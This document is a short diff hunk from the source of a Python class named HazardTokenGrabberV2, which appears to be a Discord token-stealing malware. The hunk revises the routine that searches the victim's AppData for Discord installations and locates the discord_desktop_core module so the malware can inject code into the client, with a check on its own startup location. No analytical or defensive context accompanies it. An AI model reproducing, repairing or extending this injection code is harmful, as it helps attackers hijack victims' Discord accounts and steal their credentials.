@@ -242,12 +242,13 @@ class HazardTokenGrabberV2(Functions):
         for _dir in os.listdir(self.appdata):
             if 'discord' in _dir.lower():
                 discord = self.appdata + os.sep + _dir
-                for _dir in os.listdir(os.path.abspath(discord)):
-                    if match(r'app-(\d*\.\d*)*', _dir):
-                        app = os.path.abspath(os.path.join(discord, _dir, 'modules'))
-                        for __dir in os.listdir(app):
-                            if match(r"discord_desktop_core-\d*", __dir):
-                                inj_path = app + os.sep + __dir + f'\\discord_desktop_core\\'
+                for __dir in os.listdir(os.path.abspath(discord)):
+                    if match(r'app-(\d*\.\d*)*', __dir):
+                        app = os.path.abspath(os.path.join(discord, __dir))
+                        modules = os.path.join(app, 'modules')
+                        for ___dir in os.listdir(modules):
+                            if match(r"discord_desktop_core-\d+", ___dir):
+                                inj_path = modules + os.sep + ___dir + f'\\discord_desktop_core\\'
                                 if os.path.exists(inj_path):
                                     if self.startup_loc not in argv[0]:
                                         try:
